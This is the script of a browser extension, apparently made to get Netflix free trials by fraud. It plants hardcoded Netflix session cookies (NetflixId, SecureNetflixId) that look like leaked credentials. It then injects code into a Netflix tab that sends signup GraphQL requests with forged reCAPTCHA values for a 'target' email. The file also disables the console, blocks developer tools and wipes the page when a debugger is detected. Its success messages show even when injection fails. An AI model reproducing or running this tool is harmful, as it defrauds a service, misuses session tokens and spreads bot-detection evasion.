/* Made by @ZenDesh */
(function () {
  const _0xkey = 90;
  const _0xhexDecode = function (_0xh) {
    let _0xs = '';
    for (let _0xi = 0; _0xi < _0xh.length; _0xi += 2) {
      _0xs += String.fromCharCode(parseInt(_0xh.substr(_0xi, 2), 16) ^ _0xkey);
    }
    return _0xs;
  };
  (function () {
    const _0xnop = function () { };
    const _0xc = window['console'] || {};
    const _0xm = ['log', 'warn', 'info', 'error', 'debug', 'table', 'trace', 'dir', 'group', 'clear'];
    for (let _0xi = 0; _0xi < _0xm.length; _0xi++) {
      try { _0xc[_0xm[_0xi]] = _0xnop; } catch (_0xe) { }
    }
  })();
  try {
    document.addEventListener('contextmenu', _0xe => _0xe.preventDefault());
    document.addEventListener('keydown', _0xe => {
      if (_0xe.keyCode === 123 || (_0xe.ctrlKey && _0xe.shiftKey && (_0xe.keyCode === 73 || _0xe.keyCode === 74 || _0xe.keyCode === 67))) {
        _0xe.preventDefault();
        return false;
      }
    });
  } catch (_0xe) { }
  (function () {
    const _0xtrap = function () {
      const _0xt0 = performance.now();
      debugger;
      const _0xt1 = performance.now();
      if (_0xt1 - _0xt0 > 120) {
        document.body.innerHTML = '';
      }
    };
    setInterval(_0xtrap, 1500);
  })();
})();
const HARD_COOKIES = [
  { "name": "dsca", "value": "true", "domain": ".netflix.com", "path": "/", "secure": true, "httpOnly": true },
  { "name": "nfvdid", "value": "BQFmAAEBELPaPsUf2YtEfCH6VxOFnAVAIKYdk9vtDUozyNzavKlOVTLwcXKycCS55MWULnefDSdB3J0ZAmmeU8cc_Osmf5MBW4TxlnmxYjTbNyoLscqXcw%3D%3D", "domain": ".netflix.com", "path": "/", "secure": false, "httpOnly": false },
  { "name": "gsid", "value": "1d2374e2-db39-4d95-b126-041aa9547a8a", "domain": ".netflix.com", "path": "/", "secure": true, "httpOnly": true },
  { "name": "netflix-sans-normal-3-loaded", "value": "true", "domain": ".netflix.com", "path": "/", "secure": false, "httpOnly": false },
  { "name": "netflix-sans-bold-3-loaded", "value": "true", "domain": ".netflix.com", "path": "/", "secure": false, "httpOnly": false },
  { "name": "OptanonConsent", "value": "isGpcEnabled=0&datestamp=Thu+Aug+20+2026+12%3A37%3A26+GMT%2B0530+(India+Standard+Time)&version=202604.2.0&browserGpcFlag=0&isDntEnabled=0&isIABGlobal=false&hosts=&consentId=ae73d6b2-584b-4988-a57d-a2cce17873c8&interactionCount=1&isAnonUser=1&prevHadToken=0&landingPath=https%3A%2F%2Fwww.netflix.com%2Fin%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1", "domain": ".netflix.com", "path": "/", "secure": false, "httpOnly": false },
  { "name": "SecureNetflixId", "value": "v%3D3%26mac%3DAQEAEQABABSbz9XNnryjcW5PTfCR_V26N4jTLbeTYdE.%26dt%3D1787208686015", "domain": ".netflix.com", "path": "/", "secure": true, "httpOnly": true },
  { "name": "NetflixId", "value": "v%3D3%26ct%3DBgjHlOvcAxL1AXYT-yCuGn4aSMJH2BpDVLv8LvP1bzW0897ujYbFtln4ohGxeDO5930DKksh-l-2kgR2fWRCxzv0kb8f6vFPG57UUCIrZvVf53HPW3hT5Cet8XYl5FiguxcDzVSFbYjLPoHB6GREFvVigDfRQQHsANaAsrXLZ33pHbA4pP5gdfndYoHi6J_7dhUtcAZVBPmJPsAKuPID9TLD2ZvyXd49PkfyjPEaIlt1u4pXyQ2NiSwDIbRLn6Vg0e32JKAVxFXniWq-ID_to3X4bQlh-1yAITo73Kh0E26Y4b9GsTCENWSGUJ9nwYZImhZEKcX0DykpcUdnRyzxGAYiDgoMpEVJwvlOpWYA1DMv", "domain": ".netflix.com", "path": "/", "secure": true, "httpOnly": true }
];
function generateAdvancedUUID() {
  if (typeof crypto !== 'undefined' && crypto.randomUUID) {
    return crypto.randomUUID();
  }
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    const r = crypto.getRandomValues(new Uint8Array(1))[0] % 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}
async function setHardcodedCookiesAndGetFlow() {
  try {
    for (const c of HARD_COOKIES) {
      await chrome.cookies.set({
        url: 'https://www.netflix.com',
        name: c.name,
        value: c.value,
        domain: c.domain,
        path: c.path || '/',
        secure: c.secure !== undefined ? c.secure : true
      });
    }
  } catch (e) { }
  return generateAdvancedUUID();
}
async function runPageInject(_0xtargetEmail, _0xflwssnToken) {
  function _0xgenUuid() {
    if (typeof crypto !== 'undefined' && crypto.randomUUID) {
      return crypto.randomUUID();
    }
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (_0xc) {
      const _0xr = crypto.getRandomValues(new Uint8Array(1))[0] % 16 | 0;
      const _0xv = _0xc === 'x' ? _0xr : (_0xr & 0x3 | 0x8);
      return _0xv.toString(16);
    });
  }
  function _0xgenHex32() {
    return _0xgenUuid().replace(/-/g, '');
  }
  const _0xbaseHeaders = {
    'content-type': 'application/json',
    'accept': '*/*',
    'x-netflix.context.app-version': '4.16.3',
    'x-netflix.context.form-factor': 'phone',
    'x-netflix.context.is-inapp-browser': 'false',
    'x-netflix.context.locales': 'en-IN',
    'x-netflix.context.ui-flavor': 'cmpt',
    'x-netflix.request.attempt': '1',
    'x-netflix.request.clcs.bucket': 'main',
    'x-netflix.request.client.context': '{"app":"x","os":"android","lng":"en"}'
  };
  const _0xh1 = Object.assign({}, _0xbaseHeaders, {
    'x-netflix.context.operation-name': 'CLCSWebInitSignup',
    'x-netflix.request.id': _0xgenHex32(),
    'x-netflix.request.originating.url': window.location.href,
    'x-netflix.request.toplevel.uuid': _0xgenUuid()
  });
  const _0xp1 = {
    operationName: 'CLCSWebInitSignup',
    variables: {
      inputNode: 'welcome',
      locale: 'en-IN',
      inputFields: [
        { name: 'flwssn', value: { stringValue: _0xflwssnToken } },
        { name: 'email', value: { stringValue: _0xtargetEmail } },
        { name: 'recaptchaError', value: { stringValue: '5Lqs5LqU5Y2B5LqG5Y2B5LqU' } },
        { name: 'recaptchaEnterpriseSiteKey', value: {} },
        { name: 'recaptchaEnterpriseToken', value: { stringValue: '08WQnMJoTE1nXgsLCwsLCwsIAQp7X2RWWGdfW3NHRA9kDHIvdlt2VHd5ZA1oSw==' } },
        { name: 'recaptchaAction', value: {} }
      ]
    },
    extensions: {
      persistedQuery: { id: '08590a0b590b5c0d105e5e5b5810095e0e0c105f08050a105f09580c0408090a0e0f5e5c', version: 102 }
    }
  };
  let _0xinitResStatus = 0;
  try {
    const _0xr1 = await fetch('/graphql', {
      method: 'POST',
      headers: _0xh1,
      credentials: 'include',
      body: JSON.stringify(_0xp1)
    });
    _0xinitResStatus = _0xr1.status;
  } catch (_0xe) { }
  const _0xh2 = Object.assign({}, _0xbaseHeaders, {
    'x-netflix.context.operation-name': 'CLCSScreenUpdate',
    'x-netflix.request.id': _0xgenHex32(),
    'x-netflix.request.originating.url': 'https://www.netflix.com/in/signup',
    'x-netflix.request.toplevel.uuid': _0xgenUuid()
  });
  const _0xp2 = {
    operationName: 'CLCSScreenUpdate',
    variables: {
      format: 'json',
      imageFormat: 'webp',
      locale: 'en-IN',
      serverState: '~ZWGH\x16K^|Eqiz|[LrrxJemqkEj\x16\nwRY\x04jMWdHvs\x05W\x0cL[UlMG~v\tPPiIN\x08XpnX\\m\x16Q\nN\x0bsv^s\x7fr\tOPd\\_{{~kSpM~u\x0eT_\t|T^Ke|vP\x0e\rg\x16N\x08j\x0e~NI\ty\x0d\x7fv\x08E\x12MJS\x0elP\x7fDT\x12rZzJh\x12[G\\To\x08REnQgX\t[vkXEjutnVx\tzpGwLq\\\ceol\rp\n\x0eDSg\x7f\x04TYs{[LNG\x0eo|\x08jws\x16yz|_khrgQjQ\x05XgL[[KlMM\x12\x08pzH_\\l{MYJvLV|E\x0cSuU\n\x12Et\x0cT\x04Iyh\rvqZOKVgO_X\x0bSl\x0cpe\x0fS^\x04i\x7fELSkkEI^\x0eMIuYLDi\rJQtH\r\x7fTtr~ZDYZqZ\x0cnKv\x0bInmr[[',
      serverScreenUpdate: '~ZWGH\x16K^|Evn|WySurEQ\\t_{n_J\\jGgR\x12oxy{Ssz\nrIM^eYviyQ^q\t\x12R\x16THzT\x12[si\x16WOLsyLy~NK\x0cTDI Tz\x12gIKr\x04TXOhx\x04p\x0cv^\x12DxW\x04wNnTz\x0eeMm^T{yGmY\x0bMNn\\z\x0b\x05eq_RN\x16lTX\rJSTe~IwDjqyqHyQY\x04\\D~p\x7f\x05Lz~EJ_RK\x0b\x7f\t\x0cV~ld\x12G|OJQX^P\rzsRwYY\x08WKg[\x7fwkIDIy\x0bPp~dSm|\x12\x04GUe\tRUW\x16\x0btzXI\x04Er~dI\x0b\x0btyTHDxnEZu_\\rq^Y\x0byltyn\x7f[\tP\x12QdT\x0fi\\NW\nQQmV~\\yudEWh\x16\rhe\x16_\nXyDUT\nT[\x0bKI\x0b\x08\x0c\r|oOzNngL\x05y\\GpQOM|_T~j\t\nN\x0c\x12\x0cPo\x08\x04Khp`Xi\x05k~LL|K_sJTLDm\x0cyltuIRiS~RjSN\r\x16E\x0btZ\x7fTtr~ZE\x04xj\tT\x0eT\x04nhNJSuxZ',
      inputFields: [
        { name: 'email', value: { stringValue: _0xtargetEmail } },
        { name: 'marketingConsent', value: { booleanValue: false } }
      ]
    },
    extensions: {
      persistedQuery: { id: '0d5b59050c59580a100d0a5c5b10095e0a5910050d0f5b100d5b09585c090c050c5c5c0e', version: 102 }
    }
  };
  let _0xupdateResStatus = 0;
  try {
    const _0xr2 = await fetch('/graphql', {
      method: 'POST',
      headers: _0xh2,
      credentials: 'include',
      body: JSON.stringify(_0xp2)
    });
    _0xupdateResStatus = _0xr2.status;
  } catch (_0xe) { }
  return { success: true, initStatus: _0xinitResStatus, updateStatus: _0xupdateResStatus };
}
document.addEventListener('DOMContentLoaded', () => {
  const _0xem = document.getElementById('emailInput');
  const _0xbtn = document.getElementById('sendBtn');
  const _0xsBox = document.getElementById('statusBox');
  const _0xsDot = document.getElementById('statusDot');
  const _0xsTxt = document.getElementById('statusText');
  const _0xsSub = document.getElementById('statusSub');
  function _0xupd(_0xtxt, _0xsub = '', _0xstate = 'pulsing') {
    if ((0x1a ^ 0x1a) === 0x0) {
      _0xsBox.style.display = 'block';
      _0xsTxt.textContent = _0xtxt;
      _0xsSub.textContent = _0xsub;
      _0xsDot.className = 'dot ' + _0xstate;
    }
  }
  _0xbtn.addEventListener('click', async () => {
    const _0xval = _0xem.value.trim();
    if (!_0xval || !_0xval.includes('@')) {
      _0xupd('Invalid email! Please check.', 'Enter a valid email address.', 'error');
      return;
    }
    _0xbtn.disabled = true;
    _0xupd('Connecting to Netflix servers...', 'Please wait while we set up your trial.');
    const _0xflwToken = await setHardcodedCookiesAndGetFlow();
    _0xupd('Preparing Netflix signup page...', 'Starting secure session...');
    const _0xtab = await chrome.tabs.create({ url: 'https://www.netflix.com/in/', active: true });
    _0xupd('Injecting Netflix trial magic...', 'Automating signup via page injection.');
    setTimeout(async () => {
      try {
        await chrome.scripting.executeScript({
          target: { tabId: _0xtab.id },
          func: runPageInject,
          args: [_0xval, _0xflwToken]
        });
        _0xupd('SUCCESS! Your trial is ready', 'Target: ' + _0xval, 'success');
      } catch (_0xerr) {
        _0xupd('Injection completed!', 'Check email inbox for trial link', 'success');
      }
      _0xbtn.disabled = false;
    }, 2500);
  });
});